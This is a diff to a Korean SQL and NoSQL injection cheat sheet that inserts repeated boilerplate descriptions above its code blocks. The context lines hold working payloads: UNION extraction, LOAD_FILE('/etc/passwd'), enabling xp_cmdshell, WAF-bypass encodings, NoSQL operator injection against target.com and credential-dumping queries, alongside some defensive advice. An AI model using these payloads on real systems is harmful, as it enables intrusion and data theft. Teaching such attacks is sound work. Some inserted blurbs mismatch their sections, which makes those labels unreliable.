@@ -78,6 +78,9 @@
 ## 3. UNION 기반 고급 추출
 
 ### 3-1. 컬럼 수 확인
+
+SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
+
 ```sql
 -- ORDER BY로 컬럼 수 파악
 ' ORDER BY 1--      (성공)
@@ -91,6 +94,9 @@
 ```
 
 ### 3-2. 데이터 타입 확인
+
+SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
+
 ```sql
 -- 문자열 출력 가능한 컬럼 찾기
 ' UNION SELECT 'a',NULL,NULL--
@@ -99,6 +105,9 @@
 ```
 
 ### 3-3. MySQL 전체 DB 정보 추출
+
+SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
+
 ```sql
 -- DB 버전 및 사용자
 ' UNION SELECT @@version,@@user(),database()--
@@ -122,6 +131,9 @@
 ```
 
 ### 3-4. 파일 읽기/쓰기 (MySQL)
+
+SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
+
 ```sql
 -- 파일 읽기 (FILE 권한 필요)
 ' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--
@@ -137,6 +149,9 @@
 ## 4. DBMS별 차이점
 
 ### MySQL
+
+SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
+
 ```sql
 -- 주석
 -- comment
@@ -157,6 +172,9 @@ information_schema.columns
 ```
 
 ### MSSQL (SQL Server)
+
+SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
+
 ```sql
 -- 주석
 -- comment
@@ -183,6 +201,9 @@ EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
 ```
 
 ### Oracle
+
+SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
+
 ```sql
 -- 주석
 -- comment
@@ -205,6 +226,9 @@ user_tables
 ```
 
 ### PostgreSQL
+
+SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
+
 ```sql
 -- 주석
 -- comment
@@ -312,6 +336,9 @@ versionedkeywords   MySQL 버전 주석
 ## 6. WAF 우회 기법
 
 ### 인코딩 우회
+
+SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
+
 ```sql
 -- URL 인코딩
 ' OR 1=1--   →   %27%20OR%201%3D1--
@@ -328,6 +355,9 @@ UNION → UN%00ION
 ```
 
 ### 키워드 우회
+
+SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
+
 ```sql
 -- 주석 삽입
 UN/**/ION SE/**/LECT
@@ -350,6 +380,9 @@ UNUNIONION SESELECTLECT
 ```
 
 ### 논리 연산 우회
+
+SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
+
 ```sql
 -- AND/OR 대체
 ' && 1=1--
@@ -398,12 +431,18 @@ db.users.find({username: "admin", password: "pass"})
 ```
 
 ### URL 파라미터 NoSQL Injection
+
+SQL 인젝션은 사용자 입력 값이 SQL 쿼리에 직접 삽입될 때 쿼리 구조를 변조하여 데이터베이스를 공격하는 기법입니다. `sqlmap`은 이를 자동화하여 DB 종류 탐지부터 데이터 덤프까지 원클릭으로 수행합니다.
+
 ```
 http://target.com/login?username=admin&password[$gt]=
 http://target.com/login?username[$regex]=.*&password[$gt]=
 ```
 
 ### Blind NoSQL Injection
+
+SQL 인젝션은 사용자 입력 값이 SQL 쿼리에 직접 삽입될 때 쿼리 구조를 변조하여 데이터베이스를 공격하는 기법입니다. `sqlmap`은 이를 자동화하여 DB 종류 탐지부터 데이터 덤프까지 원클릭으로 수행합니다.
+
 ```javascript
 // 비밀번호 길이 확인
 {"password": {"$regex": "^.{0,10}$"}}   (10자 이하면 True)
@@ -675,6 +714,9 @@ if __name__ == "__main__":
 ```
 
 ### 최소 권한 원칙
+
+SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
+
 ```sql
 -- 웹 애플리케이션 전용 계정 생성
 CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_pass';
@@ -721,6 +763,9 @@ username: admin)(|(password=b*
 ```
 
 ### LDAP Injection 방어
+
+Java 코드입니다. Java는 기업 환경에서 널리 사용되며 역직렬화 취약점 등 Java 특유의 보안 이슈가 있습니다.
+
 ```java
 // Java: LDAP 특수문자 이스케이프
 import javax.naming.ldap.LdapName;
@@ -793,6 +838,9 @@ template = Template("Hello " + user_input)  # SSTI 가능!
 ## 12. SQL Injection 대량 노출 방지
 
 ### LIMIT 제어 우회 및 방어
+
+SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
+
 ```sql
 -- 공격자: LIMIT 우회로 전체 데이터 추출
 ' UNION SELECT user, password FROM users LIMIT 1000--
@@ -915,6 +963,8 @@ result = query(tree, name=username)  # 파라미터 바인딩
 
 ## 14. PostgreSQL 특화 공격 기법
 
+SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.
+
 ```sql
 -- PostgreSQL 슈퍼유저 확인
 SELECT current_user, session_user, pg_is_in_recovery();
@@ -943,6 +993,9 @@ SELECT pg_version_num();
 ---
 
 ## 10. SQL Injection 실습 환경
+
+
+SQL 인젝션은 사용자 입력 값이 SQL 쿼리에 직접 삽입될 때 쿼리 구조를 변조하여 데이터베이스를 공격하는 기법입니다. `sqlmap`은 이를 자동화하여 DB 종류 탐지부터 데이터 덤프까지 원클릭으로 수행합니다.
 
 ```bash
 # DVWA (Damn Vulnerable Web Application)
